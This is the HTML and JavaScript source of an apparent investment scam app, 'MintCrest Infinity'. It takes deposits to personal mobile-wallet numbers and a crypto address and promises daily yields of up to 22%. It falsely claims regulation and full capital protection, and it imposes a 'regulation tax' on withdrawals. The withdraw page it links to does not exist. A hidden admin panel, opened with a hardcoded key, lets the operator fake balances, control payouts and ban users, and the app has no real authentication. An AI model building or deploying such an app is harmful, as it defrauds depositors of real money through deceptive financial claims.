<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <title>MintCrest Infinity | Global Node</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; margin: 0; overflow: hidden; }
        
        .app-shell { height: 100vh; overflow-y: auto; scroll-behavior: smooth; -webkit-overflow-scrolling: touch; padding-bottom: 150px; }
        ::-webkit-scrollbar { display: none; }
        
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); }
        .grad-blue { background: linear-gradient(135deg, #0052d4 0%, #4364f7 50%, #6fb1fc 100%); }
        .grad-gold { background: linear-gradient(135deg, #78350f 0%, #d97706 100%); }
        
        .active-page { display: block; animation: slideIn 0.4s ease-out; }
        .page { display: none; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .nav-btn { transition: 0.3s; opacity: 0.4; }
        .nav-active { opacity: 1; color: #6fb1fc; transform: translateY(-3px); }
        
        .marquee-wrap { background: rgba(30, 58, 138, 0.4); padding: 6px 0; overflow: hidden; white-space: nowrap; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .marquee { display: inline-block; animation: scroll 20s linear infinite; font-size: 9px; font-weight: 900; color: #60a5fa; text-transform: uppercase; }
        @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        
        .status-badge { font-size: 8px; font-weight: 900; padding: 2px 6px; border-radius: 4px; }
        .badge-pending { background: #fef3c7; color: #92400e; }
        .badge-approved { background: #dcfce7; color: #166534; }
    </style>
</head>
<body>

    <div id="ticker-wrap" class="hidden fixed top-0 w-full z-[1000] marquee-wrap">
        <div class="marquee" id="ticker-text">🚀 MINTCREST: 10% REGULATION TAX ON WITHDRAWALS — NEW FLASH NODES LIVE — CONTACT SUPPORT FOR BONUSES 🚀</div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[10000] bg-[#010409] flex flex-col items-center justify-center p-8 text-center">
        <h1 onclick="adminTap()" class="text-5xl font-black italic tracking-tighter mb-2 bg-gradient-to-r from-white via-blue-400 to-blue-600 bg-clip-text text-transparent">MINTCREST</h1>
        <p class="text-[8px] uppercase tracking-[0.5em] text-gray-500 font-bold mb-10">Official Global Vault</p>
        <div class="glass p-10 rounded-[3.5rem] w-full max-w-sm border-t border-white/10">
            <input type="text" id="user-name" placeholder="Full Identity Name" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold border border-white/10 text-white outline-none">
            <input type="text" id="ref-by" placeholder="Invite Code (Optional)" class="w-full bg-white/5 p-3 rounded-xl mb-6 text-[10px] text-center border border-white/5 outline-none">
            <button onclick="login()" class="w-full grad-blue py-5 rounded-2xl font-black uppercase text-[10px] tracking-widest shadow-xl">Unlock Vault</button>
        </div>
    </section>

    <main id="app-ui" class="hidden app-shell pt-10">
        
        <div id="p-home" class="page active-page p-6">
            <div class="grad-blue p-10 rounded-[3.5rem] mb-6 shadow-2xl relative overflow-hidden">
                <div class="flex justify-between items-start mb-6">
                    <div>
                        <p class="text-[9px] text-blue-100 font-black uppercase tracking-widest">Available Capital</p>
                        <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                    </div>
                    <button onclick="logout()" class="bg-black/20 p-3 rounded-2xl">🚀</button>
                </div>
                
                <div id="countdown-display" class="text-[9px] font-black text-yellow-300 uppercase italic bg-black/30 px-4 py-2 rounded-full inline-block">System Secure</div>
                
                <div class="mt-8 flex justify-between items-center border-t border-white/10 pt-4">
                    <div><p class="text-[8px] opacity-60 uppercase font-bold">Node Profit</p><p class="text-lg font-black" id="v-profit">₨ 0</p></div>
                    <span id="rank-badge" class="text-[8px] bg-white/10 px-4 py-2 rounded-full font-black uppercase tracking-widest text-blue-200">Standard Rank</span>
                </div>
            </div>

            <div class="glass p-5 rounded-[2.5rem] mb-6">
                <div class="flex justify-between items-center mb-4"><h3 class="text-[10px] font-black uppercase text-yellow-500 italic">🏆 Elite Leaders</h3></div>
                <div id="leaderboard" class="space-y-3"></div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center border-b-4 border-green-500 shadow-xl">📥 <span class="text-[10px] font-black block mt-2 uppercase">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center border-b-4 border-red-500 shadow-xl">📤 <span class="text-[10px] font-black block mt-2 uppercase">Withdraw</span></button>
            </div>

            <button onclick="reqAction('Daily Bonus Request', 0)" class="w-full grad-gold p-6 rounded-[2.5rem] mb-6 flex justify-between items-center shadow-2xl">
                <div class="text-left"><h4 class="text-[11px] font-black uppercase">Daily Dividends</h4><p class="text-[8px] font-bold opacity-60">REQUEST DAILY REWARD FROM ADMIN</p></div>
                <span class="text-2xl">🎁</span>
            </button>
        </div>

        <div id="p-invest" class="page p-6">
            <h3 class="text-center font-black text-xl mb-8 uppercase text-blue-500 italic tracking-tighter">Asset Fleets</h3>
            <div id="plans-list" class="space-y-3 pb-20"></div>
        </div>

        <div id="p-wallet" class="page p-6">
            <h3 class="text-center font-black text-xl mb-8 uppercase italic">Funding Nodes</h3>
            <div class="space-y-3 mb-8 text-[9px] font-black uppercase">
                <div class="glass p-5 rounded-2xl flex justify-between border-blue-500/20"><span>JAZZ / SADA</span><b class="text-blue-400">03705519562</b></div>
                <div class="glass p-5 rounded-2xl flex justify-between border-green-500/20"><span>EASYPAISA</span><b class="text-green-400">03379827882</b></div>
                <div class="glass p-5 rounded-2xl flex flex-col items-center border-yellow-500/20 gap-2">
                    <span>BINANCE (TRC20)</span>
                    <span class="text-[8px] text-yellow-400 break-all">TTSxm4pBK26RB4vXaa3Uo3hqGa5HdhxBDR</span>
                </div>
            </div>
            <div class="glass p-8 rounded-[3.5rem]">
                <input type="number" id="d-amt" placeholder="Capital Amount" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold border border-white/10 outline-none">
                <input type="text" id="d-tid" placeholder="TID / Hash Number" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold border border-white/10 outline-none uppercase">
                <input type="file" id="d-file" accept="image/*" class="w-full text-[10px] mb-6">
                <button id="dep-btn" onclick="subDep()" class="w-full grad-blue py-6 rounded-3xl font-black uppercase text-[10px] tracking-widest">Verify Capital</button>
            </div>
        </div>

        <div id="p-history" class="page p-6"><h3 class="font-black text-xl mb-8 uppercase text-center italic">Node Ledger</h3><div id="user-history" class="space-y-4"></div></div>

        <div id="p-more" class="page p-6 space-y-6">
            <div class="glass p-8 rounded-[3rem] border-l-8 border-blue-600">
                <h3 class="text-blue-500 font-black text-[10px] uppercase mb-2">Firm Integrity</h3>
                <p class="text-[8.5px] text-gray-400 font-bold uppercase leading-relaxed">MintCrest Infinity is a regulated digital asset firm. We ensure 100% capital protection and daily dividends via military-grade encryption.</p>
            </div>
            
            <div class="glass p-8 rounded-[3rem] border-t-4 border-purple-500">
                <p class="text-[10px] font-black text-purple-400 mb-2 uppercase italic">Partnership Program (5%)</p>
                <div class="flex gap-2">
                    <input type="text" id="ref-link" readonly class="flex-1 bg-white/5 p-4 rounded-xl text-[9px] font-black border border-white/10 text-blue-300">
                    <button onclick="copyRef()" class="bg-purple-600 px-6 rounded-xl font-black text-[9px] uppercase">Copy</button>
                </div>
            </div>

            <div class="glass p-8 rounded-[3rem]">
                <h3 class="text-green-500 font-black text-[10px] uppercase mb-4 text-center italic">Support Inquiry</h3>
                <textarea id="support-msg" placeholder="Describe your issue..." class="w-full bg-white/5 p-4 rounded-xl text-[10px] border border-white/10 mb-4 h-24 outline-none"></textarea>
                <button onclick="sendSupport()" class="w-full bg-green-600 py-3 rounded-xl font-black text-[9px] uppercase">Send Message</button>
            </div>
        </div>

    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000814] z-[50000] hidden overflow-y-auto">
        <header class="p-8 border-b border-white/10 bg-[#000814]/80 sticky top-0 flex justify-between items-center backdrop-blur-xl">
            <h2 class="text-2xl font-black text-blue-500 italic">COMMAND NODE</h2>
            <button onclick="closeAdm()" class="bg-red-600 px-6 py-2 rounded-xl text-[9px] font-black uppercase">Exit</button>
        </header>
        
        <div class="p-6">
            <div class="grid grid-cols-2 gap-4 mb-8">
                <div class="glass p-6 rounded-3xl text-center"><p class="text-[8px] opacity-40 uppercase">Total Nodes</p><h4 id="adm-u-count" class="text-2xl font-black">0</h4></div>
                <div class="glass p-6 rounded-3xl text-center"><p class="text-[8px] opacity-40 uppercase">Pending Reqs</p><h4 id="adm-p-count" class="text-2xl font-black text-yellow-500">0</h4></div>
            </div>

            <div class="grid grid-cols-3 gap-2 mb-8">
                <button onclick="showTab('reqs')" class="grad-blue py-3 rounded-xl text-[8px] font-black uppercase">Requests</button>
                <button onclick="showTab('users')" class="glass py-3 rounded-xl text-[8px] font-black uppercase">Nodes</button>
                <button onclick="showTab('tools')" class="grad-gold py-3 rounded-xl text-[8px] font-black uppercase">Tools</button>
            </div>

            <div id="tab-reqs" class="adm-tab space-y-4"></div>
            <div id="tab-users" class="adm-tab hidden space-y-2"></div>
            <div id="tab-tools" class="adm-tab hidden space-y-6">
                <div class="glass p-8 rounded-[3rem]">
                    <h3 class="text-[10px] font-black text-blue-400 mb-4 uppercase text-center italic">Manual Capital Control</h3>
                    <input type="text" id="adm-target" placeholder="Node Identity Name" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center text-[10px] font-bold border border-white/10">
                    <div class="grid grid-cols-2 gap-2">
                        <button onclick="manualAdj('balance')" class="bg-blue-600 py-3 rounded-xl text-[8px] font-black">ADD CAPITAL</button>
                        <button onclick="manualAdj('profit')" class="bg-cyan-600 py-3 rounded-xl text-[8px] font-black">ADD PROFIT</button>
                    </div>
                </div>
                <div class="glass p-8 rounded-[3rem]">
                    <h3 class="text-[10px] font-black text-amber-500 mb-4 uppercase text-center italic">Broadcast News</h3>
                    <textarea id="adm-bc" class="w-full bg-white/5 p-4 rounded-xl text-[10px] border border-white/10 mb-4"></textarea>
                    <button onclick="setBC()" class="w-full grad-gold py-3 rounded-xl font-black text-[9px]">PUSH TICKER</button>
                </div>
            </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass p-8 flex justify-around items-center fixed bottom-0 w-full z-[2000] rounded-t-[4rem] border-t border-white/5">
        <button onclick="changePage('home')" id="n-home" class="nav-btn nav-active text-2xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="nav-btn text-2xl">📈</button>
        <button onclick="changePage('history')" id="n-history" class="nav-btn text-2xl">📜</button>
        <button onclick="changePage('more')" id="n-more" class="nav-btn text-2xl">🏢</button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore(); const storage = firebase.storage();
        let user = null; let tapCount = 0;

        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3 }, { n: "Bronze-S", p: 1000, r: 3.5 }, { n: "Silver-X", p: 5000, r: 4.5 },
            { n: "Gold-X", p: 10000, r: 5.5 }, { n: "Diamond-Master", p: 50000, r: 8 },
            { n: "⚡ FLASH 24H", p: 500, r: 12, s: true }, { n: "🚀 ROCKET PRO", p: 12000, r: 18, s: true }, { n: "👑 CROWN KING", p: 25000, r: 22, s: true }
        ];

        window.onload = () => {
            const saved = localStorage.getItem('mint_v36_session');
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateTimers, 1000);
        };

        async function login() {
            const n = document.getElementById('user-name').value.trim().toLowerCase();
            const r = document.getElementById('ref-by').value.trim().toLowerCase();
            if(!n) return;
            const ref = db.collection("users").doc(n); const d = await ref.get();
            if(!d.exists) await ref.set({ name: n, balance: 0, profit: 0, refBy: r || 'Direct', time: Date.now(), activeTier: 0, tierROI: 0, lastReqTime: Date.now(), status: 'active' });
            localStorage.setItem('mint_v36_session', n);
            document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden');
            document.getElementById('bottom-nav').classList.remove('hidden'); document.getElementById('ref-link').value = n;
            syncData(n); renderPlans(); renderLeaderboard();
        }

        function syncData(n) {
            db.collection("users").doc(n).onSnapshot(d => {
                user = d.data();
                if(user.status === 'banned') { alert("Node Access Denied! 😘"); logout(); }
                document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString();
                document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString();
                let rank = "STANDARD NODE"; if(user.balance >= 10000) rank = "GOLD INVESTOR"; if(user.balance >= 50000) rank = "DIAMOND WHALE";
                document.getElementById('rank-badge').innerText = rank;
            });
            db.collection("requests").where("user", "==", n).orderBy("time", "desc").onSnapshot(s => {
                const l = document.getElementById('user-history'); l.innerHTML = '';
                s.forEach(doc => { const x = doc.data(); l.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center border-l-4 ${x.status==='approved'?'border-green-500':'border-yellow-500'}"><div class="text-[9px] font-black uppercase"><div>${x.type}</div><div class="opacity-30 text-[7px]">${new Date(x.time).toLocaleTimeString()}</div></div><div class="text-right text-[10px] font-black">₨ ${x.amount}<br><span class="status-badge badge-${x.status}">${x.status}</span></div></div>`; });
            });
            db.collection("app_data").doc("announcement").onSnapshot(d => { if(d.exists) { document.getElementById('ticker-wrap').classList.remove('hidden'); document.getElementById('ticker-text').innerText = d.data().message; } });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                list.innerHTML += `<div onclick="buyPlan(${p.p}, ${p.r}, '${p.n}')" class="glass p-6 rounded-[2.5rem] flex justify-between items-center border-b-2 ${p.s?'border-purple-500 shadow-[0_0_20px_rgba(139,92,246,0.2)]':'border-white/5'}"><div><h4 class="font-black text-[10px] uppercase ${p.s?'text-purple-400':'text-gray-300'}">${p.n}</h4><p class="text-[8px] text-blue-400 font-black uppercase">${p.r}% Daily Yield</p></div><div class="text-lg font-black italic">₨ ${p.p.toLocaleString()}</div></div>`;
            });
        }

        async function buyPlan(p, roi, name) {
            if(user.balance < p) { alert("Capital Required, Sweetie! 😘"); changePage('wallet'); return; }
            if(confirm("Deploy "+name+"?")) {
                await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, lastReqTime: Date.now() });
                await db.collection("requests").add({ user: user.name, amount: p, type: "Fleet Activation", status: "approved", time: Date.now() });
                alert("Node Deployed! 😘");
            }
        }

        function updateTimers() {
            if (user && user.activeTier > 0) {
                const diff = (user.lastReqTime + 86400000) - Date.now();
                if(diff > 0) {
                    const h = Math.floor(diff/3600000); const m = Math.floor((diff%3600000)/60000); const s = Math.floor((diff%60000)/1000);
                    document.getElementById('countdown-display').innerText = `NEXT YIELD: ${h}H ${m}M ${s}S`;
                } else { 
                    document.getElementById('countdown-display').innerText = "YIELD READY";
                    autoYield();
                }
            }
        }

        async function autoYield() {
            const amt = (user.activeTier * user.tierROI) / 100;
            await db.collection("requests").add({ user: user.name, amount: amt, type: "Daily Profit Yield", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ lastReqTime: Date.now() });
        }

        async function subDep() {
            const a = parseInt(document.getElementById('d-amt').value); const t = document.getElementById('d-tid').value; const f = document.getElementById('d-file').files[0];
            if(!a || !t || !f) return alert("Fill all details, Sir! 😘");
            const btn = document.getElementById('dep-btn'); btn.innerText = "UPLOADING..."; btn.disabled = true;
            try {
                const sRef = storage.ref(`proofs/${Date.now()}_${user.name}`); await sRef.put(f); const url = await sRef.getDownloadURL();
                await db.collection("requests").add({ user: user.name, amount: a, tid: t, proof: url, type: "Deposit", status: "pending", time: Date.now(), refBy: user.refBy });
                alert("Request Sent! 😘"); changePage('home');
            } catch(e) { alert("Check Storage Rules!"); }
            btn.innerText = "Verify Capital"; btn.disabled = false;
        }

        async function reqAction(type, amt) {
            await db.collection("requests").add({ user: user.name, amount: amt, type: type, status: "pending", time: Date.now() });
            alert("Request Logged, Sweetie! 😘");
        }

        async function sendSupport() {
            const m = document.getElementById('support-msg').value; if(!m) return;
            await db.collection("support").add({ user: user.name, message: m, time: Date.now() });
            alert("Inquiry Sent! 😘"); document.getElementById('support-msg').value = '';
        }

        // ADMIN FUNCTIONS
        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("System Key:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdm(); } tapCount=0; } }
        function closeAdm() { document.getElementById('admin-panel').classList.add('hidden'); }
        function showTab(t) { document.querySelectorAll('.adm-tab').forEach(s=>s.classList.add('hidden')); document.getElementById('tab-'+t).classList.remove('hidden'); }

        async function syncAdm() {
            db.collection("users").onSnapshot(s => {
                document.getElementById('adm-u-count').innerText = s.size;
                const ul = document.getElementById('tab-users'); ul.innerHTML = '';
                s.forEach(doc => { const u = doc.data(); ul.innerHTML += `<div class="glass p-4 rounded-2xl flex justify-between items-center text-[9px] font-black uppercase"><div>${u.name}<br>Bal: ${u.balance}</div><button onclick="banUser('${doc.id}')" class="text-rose-500">BAN</button></div>`; });
            });
            db.collection("requests").where("status", "==", "pending").onSnapshot(s => {
                document.getElementById('adm-p-count').innerText = s.size;
                const rl = document.getElementById('tab-reqs'); rl.innerHTML = '';
                s.forEach(doc => { const x = doc.data(); rl.innerHTML += `<div class="glass p-6 rounded-3xl text-[10px] border border-white/10"><p class="font-black text-blue-400 uppercase">${x.user} - ₨ ${x.amount} (${x.type})</p><p class="opacity-40 mt-1 uppercase">TID/Acc: ${x.tid || x.acc || 'N/A'}</p>${x.proof?`<a href="${x.proof}" target="_blank" class="block text-center py-2 bg-blue-600 rounded-xl my-3 font-black">VIEW PROOF</a>`:''}<div class="flex gap-2"><button onclick="hnd('${doc.id}','${x.user}',${x.amount},'approved','${x.type}')" class="flex-1 bg-green-600 py-3 rounded-xl font-bold">APPROVE</button><button onclick="hnd('${doc.id}','${x.user}',${x.amount},'rejected','${x.type}')" class="flex-1 bg-red-600 py-3 rounded-xl font-bold">REJECT</button></div></div>`; });
            });
        }

        async function hnd(id, u, amt, act, type) {
            const ref = db.collection("users").doc(u); const d = await ref.get();
            if(act==='approved') {
                if(type === "Daily Bonus Request") { const b = parseInt(prompt("Enter Bonus Amount:")); await ref.update({ balance: d.data().balance + b }); await db.collection("requests").doc(id).update({ status: 'approved', amount: b }); return; }
                if(type === "Deposit" || type.includes("Yield")) await ref.update({ balance: d.data().balance + amt });
            }
            await db.collection("requests").doc(id).update({ status: act });
        }

        async function setBC() { const m = document.getElementById('adm-bc').value; await db.collection("app_data").doc("announcement").set({ message: m }); alert("News Updated! 😘"); }
        async function manualAdj(f) { const u = document.getElementById('adm-target').value.toLowerCase(); const v = parseInt(prompt("Amount to add:")); await db.collection("users").doc(u).update({ [f]: firebase.firestore.FieldValue.increment(v) }); alert("Manual Adjustment Complete! 😘"); }
        async function banUser(id) { if(confirm("Ban Node?")) await db.collection("users").doc(id).update({ status: 'banned' }); }
        
        function logout() { localStorage.removeItem('mint_v36_session'); location.reload(); }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('nav-active')); document.getElementById('n-'+p).classList.add('nav-active'); }
        function copyRef() { navigator.clipboard.writeText(user.name); alert("ID Copied, Sweetie! 😘"); }
        async function renderLeaderboard() { db.collection("users").orderBy("balance", "desc").limit(5).onSnapshot(s => { const l = document.getElementById('leaderboard'); l.innerHTML = ''; let r=1; s.forEach(doc => { const u = doc.data(); l.innerHTML += `<div class="flex justify-between text-[10px] font-bold opacity-60"><span>${r}. ${u.name.toUpperCase()}</span><span>₨ ${u.balance.toLocaleString()}</span></div>`; r++; }); }); }
    </script>
</body>
</html>
